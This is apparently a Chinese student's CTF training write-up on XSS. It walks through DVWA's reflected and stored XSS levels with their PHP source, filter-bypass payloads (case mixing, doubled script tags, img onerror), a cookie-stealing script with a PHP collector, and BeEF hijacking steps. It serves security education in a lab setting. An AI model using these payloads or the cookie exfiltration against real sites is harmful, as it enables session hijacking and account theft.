---
title: WEB入门（四）
date: 2018-07-08 09:08:01
tags: [ctf, web]
---

涛哥带我学 XSS。

<!-- more -->

# 基础知识

## HTML

一种超文本标记语言。其结构包括头部分（Head）和主体部分（Body），其中头部提供关于网页的信息，主体部分提供网页的具体内容。由 HTML 各类标签组成。

各类标签：

|  标签  |      功能      |
| :----: | :------------: |
|  img   |    插入图片    |
|  body  |   文档的主体   |
| iframe | 在网页显示网页 |

## Javascript

一种直译式脚本语言，是一种动态类型、弱类型、基于原型的语言，内置支持类型。它的解释器被称为 JavaScript 引擎，为浏览器的一部分，广泛用于客户端的脚本语言，最早是在 HTML 网页上使用，用来给 HTML 网页增加动态功能。

## cookie 与 session

会话（Session）跟踪是 Web 程序中常用的技术，用来跟踪用户的整个会话。常用的会话跟踪技术是 Cookie 与 Session。Cookie 通过在客户端记录信息确定用户身份，Session 通过在服务器端记录信息确定用户身份。

## WAF

Web 应用防护系统（也称：网站应用级入侵防御系统。英文：Web Application Firewall，简称： WAF）。国际上公认的一种说法是：Web 应用防火墙是通过执行一系列针对 HTTP/HTTPS 的安全策略来专门为 Web 应用提供保护的一款产品。

# Javascript 弹框操作

Javascript 函数内嵌实现形式：`<script>Javascript的函数</script>`

相关函数：

- `alert()`：用于提示
- `confirm()`：用于和用户交互确认
- `prompt()`：弹框让用户输入信息

# XSS

跨站脚本攻击（cross site script execution），一种出现在 web 应用程序中的计算机安全漏洞。由于 web 应用对用户的输入过滤不严而产生。恶意攻击者通过 HTML 注入篡改网页，插入恶意脚本，从而控制用户浏览器行为的一种攻击方式。

## 危害

- 网络钓鱼，包括盗取各类的用户账号
- 窃取用户 cookie
- 强制弹出广告页面，刷流量
- 页面挂马
- 提升用户权限，进一步渗透网站
- 传播扩展脚本蠕虫

相比于 SQL 注入，SQL 注入是对后端的恶意篡改，而 XSS 是对前端的恶意攻击。

## 反射型 XSS

也称为非持久性、参数型跨站脚本。主要用于将恶意的脚本附加到 URL 地址的参数中。

一般使用的已经构造好的恶意 URL 发送给受害者，诱使受害者点击触发，只执行一次。

![](/pics/WEB集训/四/1.png)

## 存储型 XSS

比反射型跨站脚本更具威胁，并且可能影响到 web 服务器的自身安全。

攻击者事先将恶意 JavaScript 代码上传或存储到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。

![](/pics/WEB集训/四/2.png)

# 绕过 XSS 限制

- 绕过 `magic_quotes_gpc`（通过 `String.fromCharCode()` 函数）
- HEX 编码
- 改变大小写
- 关闭标签（`><script>slert('xss');</script>`）（闭合前面的标签）

# 相关 PHP 函数

- `str_replace()`：以其他字符替换字符串中的一些字符（区分大小写）
- `addslashes()`：在预定义字符（`'`、`"`、`\`、NULL）之前添加反斜杠
- `stripslashes()`：删除由 `addslashes()` 函数添加的反斜杠
- `trim()`：移除字符串两侧的空白字符或其他预定义字符
- `htmlspecialchars()`：把预定义的字符转换为 HTML 实体（`&`（和号）成为`&`；`"`（双引号）成为`"`；`'`（单引号）成为 '；`<`（小于）成为`<`；`>`（大于）成为`>`）
- `htmlspecialchars_decode()`：把预定义的 HTML 实体转换为字符
- `mysql_real_escape_string()`：对字符串中的特殊符号（`\x00`、`\n`、`\r`、`\`、`'`、`"`、`\x1a`）进行转义
- `strip_tags()`：剥去字符串中的 HTML、XML 以及 PHP 的标签，但允许使用 `<b>` 标签

# DVWA 之 XSS

今天在这里遇到了两个坑记录一下。

发现 Metasploitable 中的 DVWA 版本有点新，High Level 竟然就是 Impossible Level。最后还是用了以前 PHPSTUDY 里的旧版本来实验。

还有就是重置数据库的时候出现了无法删除 dvwa 数据库的错误。在命令行和图形界面都删除不了，最后直接去 mysql 目录下删除，才可以重置。

![](/pics/WEB集训/四/3.png)

实验中主要根据源码分析被过滤的部分，寻找绕过的方法。

## XSS Reflected（反射型 XSS）

反射型相对简单一些。

### Low

源码：

```php
<?php
// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Feedback for end user
    echo '<pre>Hello ' . $_GET[ 'name' ] . '</pre>';
}
?>
```

这里显然对输入内容没有任何过滤。直接输入 `<script>alert('1')</script>` 就有弹窗回显。

![](/pics/WEB集训/四/4.png)

### Medium

源码：

```php
<?php
// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Get input
    $name = str_replace( '<script>', '', $_GET[ 'name' ] );
    // Feedback for end user
    echo "<pre>Hello ${name}</pre>";
}
?>
```

这里通过 `str_replace` 函数，将字符串 `<script>` 替换成空串，故只要双写或是大小写混用即可绕过。

构造 `<SCript>alert('1')</script>` 或者 `<scri<script>pt>alert('1')</script>`。

![](/pics/WEB集训/四/5.png)

### High

源码：

```php
<?php
// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Get input
    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] );
    // Feedback for end user
    echo "<pre>Hello ${name}</pre>";
}
?>
```

源码中将所有的 `<script>` 完全过滤了（正则表达式中 `/i` 表示不区分大小写），使用 `<script>` 标签没有任何作用，所以需要通过其他方式。

在 HTML 的标签中，img、body、iframe 等标签的 src 注入恶意代码。payload 为：`<img src=1 onerror=alert("1") />`（`onerror`事件会在文档或图像加载过程中发生错误时被触发。在装载文档或图像的过程中如果发生了错误，就会调用该事件句柄。）

![](/pics/WEB集训/四/6.png)

### Impossible

源码：

```php
<?php
// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Check Anti-CSRF token
checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
    // Get input
    $name = htmlspecialchars( $_GET[ 'name' ] );
    // Feedback for end user
    echo "<pre>Hello ${name}</pre>";
}
// Generate Anti-CSRF token
generateSessionToken();
?>
```

这里使用了 `htmlspecialchars()` 函数，将输入的恶意代码转换成 HTML 实体，完全过滤了恶意代码，无法进行攻击。

## XSS Stored（存储型 XSS）

存储型大多数存在留言板中，留言板又一般存在几个文本输入框。每个输入框都可以测试一下是否存在 XSS。

每次成功弹窗后，恶意代码都会被存储到数据库中，所以每次进入该页面都会出现之前的弹窗。

### Low

源码：

```php
<?php
if( isset( $_POST[ 'btnSign' ] ) ) {
    // Get input
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );
    // Sanitize message input
    $message = stripslashes( $message );
    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    // Sanitize name input
    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    // Update database
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
    //mysql_close();
}
?>
```

源码中对 name 和 message 处的信息没有做任何过滤，故可以直接尝试 xss。

在 message 一栏直接输入 `<script>alert('1');</script>` 就可以出发弹窗。在 name 一栏中有字数长度限制，故用 burpsuite 抓包之后，再修改 name 栏中的字符串为 `<script>alert('1');</script>`，放包后触发弹窗。

![](/pics/WEB集训/四/7.png)

![](/pics/WEB集训/四/8.png)

### Medium

源码：

```php
 <?php
if(isset($_POST['btnSign']))
{
   $message = trim($_POST['mtxMessage']);
   $name    = trim($_POST['txtName']);
   // Sanitize message input
   $message = trim(strip_tags(addslashes($message)));
   $message = mysql_real_escape_string($message);
   $message = htmlspecialchars($message);
   // Sanitize name input
   $name = str_replace('<script>', '', $name);
   $name = mysql_real_escape_string($name);
   $query = "INSERT INTO guestbook (comment,name) VALUES ('$message','$name');";
   $result = mysql_query($query) or die('<pre>' . mysql_error() . '</pre>' );
}
?>
```

这里和前一题一样，通过 `str_replace` 函数，将字符串 `<script>` 替换成空串。

name 处可以继续通过抓包来进行 XSS。而 message 处输入的内容被 `htmlspecialchars()` 函数过滤，不存在 XSS。

![](/pics/WEB集训/四/9.png)

### High

源码：

```php
<?php
if( isset( $_POST[ 'btnSign' ] ) ) {
    // Get input
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );
    // Sanitize message input
    $message = strip_tags( addslashes( $message ) );
    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $message = htmlspecialchars( $message );
    // Sanitize name input
    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $name );
    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    // Update database
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
    //mysql_close();
}
?>
```

在 name 处和上一题的 high level 处是一样的漏洞。故虽然过滤了 `<script>`，我们还是可以通过 HTML 的标签触发事件，引起弹窗。

![](/pics/WEB集训/四/10.png)

### Impossible

源码：

```php
<?php
if( isset( $_POST[ 'btnSign' ] ) ) {
    // Check Anti-CSRF token
checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
    // Get input
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );
    // Sanitize message input
    $message = stripslashes( $message );
    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $message = htmlspecialchars( $message );
    // Sanitize name input
    $name = stripslashes( $name );
    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $name = htmlspecialchars( $name );
    // Update database
    $data = $db->prepare( 'INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );' );
    $data->bindParam( ':message', $message, PDO::PARAM_STR );
    $data->bindParam( ':name', $name, PDO::PARAM_STR );
    $data->execute();
}
// Generate Anti-CSRF token
generateSessionToken();
?>
```

将 name 和 message 处输入的数据都经过 `htmlspecialchars()` 函数的处理，完全被过滤。

# XSS 盗取 cookie

攻击原理：通过 XSS 漏洞，利用一些 js 函数来获取用户信息。

![](/pics/WEB集训/四/11.png)

先在网站根目录下放入如下 php 文件：

```php
<?php
	$cookie = $_GET['cookie'];
	file_put_contents('cookie.txt', $cookie)
?>
```

PHP 文件中的`'`很容易和中文的单引号`‘`搞混。

以下为 XSS 的 payload：

```js
<script>document.location="http://127.0.0.1/dvwa/cookie.php?cookie="+document.cookie;</script>
```

输入 payload 后，在网站根目录下 `cookie.txt` 中存入了 cookie 的值。

![](/pics/WEB集训/四/12.png)

![](/pics/WEB集训/四/13.png)

# BeEF

The Browser Exploitation Framework，一个著名的 XSS 利用框架，是一个交互界面友好、高度集成、开源的一个项目。BeEF 可以和 MSF 结合起来一起使用。

PS：MSF 是一个免费的、可下载的框架，通过它可以很容易地获取、开发并对计算机软件漏洞实施攻击。它本身附带数百个已知软件漏洞的专业级漏洞攻击工具。

如何用 BeEF 进行客户端劫持：

1. 在 Kali 下打开 BeEF
2. 得到管理界面的 URL 和攻击 URL
3. 利用 XSS 漏洞来访问攻击的 URL

# 参考网站

http://www.freebuf.com/articles/web/123779.html
https://www.cnblogs.com/andy-zhou/p/5360107.html
